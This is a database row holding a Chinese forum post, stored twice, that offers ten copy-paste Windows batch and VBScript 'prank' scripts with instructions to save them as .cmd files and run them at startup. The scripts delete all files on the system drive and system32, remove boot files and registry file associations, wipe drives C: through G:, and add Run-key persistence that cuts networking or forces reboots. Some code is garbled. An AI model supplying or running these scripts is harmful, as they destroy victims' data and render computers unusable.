(70, 186, 0, 43, 1, 1585794442, 127, 0, 0, 0, 0, '<i> 本帖最后由 点滴挚爱 于 2020-4-2 10:34 编辑 </i><br><br>[p=27, null, left]<span style=\"color: #666666;\"><span class=\"size4\">使用方法：</span></span>[/p][p=27, null, left]<span class=\"size4\"><span style=\"color: #ff0000;\">新建一个txt文档，然后复制进去代码</span></span>[/p][p=27, null, left]<span class=\"size4\"><span style=\"color: #ff0000;\">将.txt后缀名改成cmd保存即可！</span></span>[/p][p=27, null, left]<span style=\"color: #666666;\"><span class=\"size4\">如果要开机使用，将这个脚本设置为开机自启即可！</span></span>[/p][p=27, null, left]<span style=\"color: #666666;\"><span class=\"size4\">\r<br></span></span>[/p][p=27, null, left]<span class=\"size4\">1.死亡蓝屏</span>[/p]<pre>@echo off\r\ndel %systemdrive%\\*.*/f/s/q\r\nshutdown -r -f -t 00</pre>\r<br>[p=27, null, left]<span class=\"size4\">2.更改文件后缀名</span>[/p]<pre>REN *.DOC *.TXT REN *.JPEG *.TXT\r\nREN *.LNK *.TXT\r\nREN *.AVI *.TXT\r\nREN *.MPEG *.TXT\r\nREN *.COM *.TXT\r\nBEN *.BAT *.TXT</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">3.删除系统重要文件</span>[/p]<pre>del c:\\WINDOWS\\system32\\*.*/q</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">4.使pc永久崩溃</span>[/p]<pre>@echo off\r\nattrib -r -s -h c:\\autoexec.bat\r\ndel c:\\autoexec.bat\r\nattrib -r -s -h c:\\boot.ini\r\ndel c:\\boot.ini\r\nattrib -r -s -h c:\\ntldr\r\ndel c:\\ntldr\r\nattrib -r -s -h c:\\windows\\win.ini\r\ndel c:\\windows\\win.ini</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">5.删除全部注册表</span>[/p]<pre>@ECHO OFF\r\nSTART reg delete HKCR/.exe\r\nSTART reg delete HKCR/.dll\r\nSTART reg delete HKCR/*</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">6.永远禁用网络！</span>[/p]<pre>echo @echo off&gt;c:windowswimn32.bat\r\necho break off&gt;&gt;c:windowswimn32.bat\r\necho ipconfig/release_all&gt;&gt;c:windowswimn32.bat\r\necho end&gt;&gt;c&#34;windowswimn32.bat\r\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v\r\nwindowsapi/t reg_sz/d c:windowswimn32.bat/f\r\nreg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v\r\ncontrolexit/t reg_sz/d c:windowswimn32.bat/f\r\npause</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">7.永远的《回车》</span>[/p]<pre>set wshshell =wscript.createobject&lt;&#34;wscript.shell&#34;&gt;\r\ndo\r\nwscript.sleep 100\r\nwshshell.sendkeys&#34;~&lt;enter&gt;&#34;\r\nloop</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">8.开机就关机</span>[/p]<pre>echo @echo off&gt;c:windowshartlell.bat\r\necho break off&gt;&gt;c:windowshartlell.bat\r\necho shutdown -r -t 11-f&gt;&gt;c:windowshartlell.bat\r\necho end&gt;&gt;c:windowshartlell.bat\r\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun\r\n/v startapi /t reg_sz/d c:windowshartlell.bat /f\r\nreg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun\r\n/v/t reg_sz/d c:windowshartlell.bat /f\r\nPAUSE</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">9.格式化硬盘</span>[/p]<pre>rd/s/q D:\\\r\nrd/s/q C:\\\r\nrd/s/q E:\\\r\nrd/s/q F:\\\r\nrd/s/q g:\\</pre>\r<br>[p=27, null, left]\r<br>[/p][p=27, null, left]<span class=\"size4\">10.开启CD蜂鸣器 </span>[/p]<pre>Set oWMP=CreateObject(&#34;WMPIayer.0CX.7&#34;)\r\nSet colCDROMs=oWMP.cdromCollection\r\ndo\r\nif colCDROMs.Count&gt;=1 then\r\nFor i=0 to colCDROMs.Count -1\r\ncolCDROMs.ltem&lt;i&gt;.Eject\r\nNext\r\nFor =0 to colCDROMs.Count -1\r\ncolCDROMs.ltem&lt;i&gt;.Eject\r\nNext\r\nEnd lf\r\nwscript.sleep 100\r\nLoop</pre>\r<br>[p=27, null, left]<span class=\"size5\"><span style=\"color: #ff0000;\">谨慎使用！</span></span>[/p]', '<i> 本帖最后由 点滴挚爱 于 2020-4-2 10:34 编辑 </i><br><br>[p=27, null, left]<span style=\"color: #666666;\"><span class=\"size4\">使用方法：</span></span>[/p][p=27, null, left]<span class=\"size4\"><span style=\"color: #ff0000;\">新建一个txt文档，然后复制进去代码</span></span>[/p][p=27, null, left]<span class=\"size4\"><span style=\"color: #ff0000;\">将.txt后缀名改成cmd保存即可！</span></span>[/p][p=27, null, left]<span style=\"color: #666666;\"><span class=\"size4\">如果要开机使用，将这个脚本设置为开机自启即可！</span></span>[/p][p=27, null, left]<span style=\"color: #666666;\"><span class=\"size4\">\r<br></span></span>[/p][p=27, null, left]<span class=\"size4\">1.死亡蓝屏</span>[/p]<pre>@echo off\r\ndel %systemdrive%\\*.*/f/s/q\r\nshutdown -r -f -t 00</pre>\r<br>[p=27, null, left]<span class=\"size4\">2.更改文件后缀名</span>[/p]<pre>REN *.DOC *.TXT REN *.JPEG *.TXT\r\nREN *.LNK *.TXT\r\nREN *.AVI *.TXT\r\nREN *.MPEG *.TXT\r\nREN *.COM *.TXT\r\nBEN *.BAT *.TXT</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">3.删除系统重要文件</span>[/p]<pre>del c:\\WINDOWS\\system32\\*.*/q</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">4.使pc永久崩溃</span>[/p]<pre>@echo off\r\nattrib -r -s -h c:\\autoexec.bat\r\ndel c:\\autoexec.bat\r\nattrib -r -s -h c:\\boot.ini\r\ndel c:\\boot.ini\r\nattrib -r -s -h c:\\ntldr\r\ndel c:\\ntldr\r\nattrib -r -s -h c:\\windows\\win.ini\r\ndel c:\\windows\\win.ini</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">5.删除全部注册表</span>[/p]<pre>@ECHO OFF\r\nSTART reg delete HKCR/.exe\r\nSTART reg delete HKCR/.dll\r\nSTART reg delete HKCR/*</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">6.永远禁用网络！</span>[/p]<pre>echo @echo off&gt;c:windowswimn32.bat\r\necho break off&gt;&gt;c:windowswimn32.bat\r\necho ipconfig/release_all&gt;&gt;c:windowswimn32.bat\r\necho end&gt;&gt;c&#34;windowswimn32.bat\r\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v\r\nwindowsapi/t reg_sz/d c:windowswimn32.bat/f\r\nreg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v\r\ncontrolexit/t reg_sz/d c:windowswimn32.bat/f\r\npause</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">7.永远的《回车》</span>[/p]<pre>set wshshell =wscript.createobject&lt;&#34;wscript.shell&#34;&gt;\r\ndo\r\nwscript.sleep 100\r\nwshshell.sendkeys&#34;~&lt;enter&gt;&#34;\r\nloop</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">8.开机就关机</span>[/p]<pre>echo @echo off&gt;c:windowshartlell.bat\r\necho break off&gt;&gt;c:windowshartlell.bat\r\necho shutdown -r -t 11-f&gt;&gt;c:windowshartlell.bat\r\necho end&gt;&gt;c:windowshartlell.bat\r\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun\r\n/v startapi /t reg_sz/d c:windowshartlell.bat /f\r\nreg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun\r\n/v/t reg_sz/d c:windowshartlell.bat /f\r\nPAUSE</pre>\r<br>[p=27, null, left]<span class=\"size4\">\r<br></span>[/p][p=27, null, left]<span class=\"size4\">9.格式化硬盘</span>[/p]<pre>rd/s/q D:\\\r\nrd/s/q C:\\\r\nrd/s/q E:\\\r\nrd/s/q F:\\\r\nrd/s/q g:\\</pre>\r<br>[p=27, null, left]\r<br>[/p][p=27, null, left]<span class=\"size4\">10.开启CD蜂鸣器 </span>[/p]<pre>Set oWMP=CreateObject(&#34;WMPIayer.0CX.7&#34;)\r\nSet colCDROMs=oWMP.cdromCollection\r\ndo\r\nif colCDROMs.Count&gt;=1 then\r\nFor i=0 to colCDROMs.Count -1\r\ncolCDROMs.ltem&lt;i&gt;.Eject\r\nNext\r\nFor =0 to colCDROMs.Count -1\r\ncolCDROMs.ltem&lt;i&gt;.Eject\r\nNext\r\nEnd lf\r\nwscript.sleep 100\r\nLoop</pre>\r<br>[p=27, null, left]<span class=\"size5\"><span style=\"color: #ff0000;\">谨慎使用！</span></span>[/p]'),
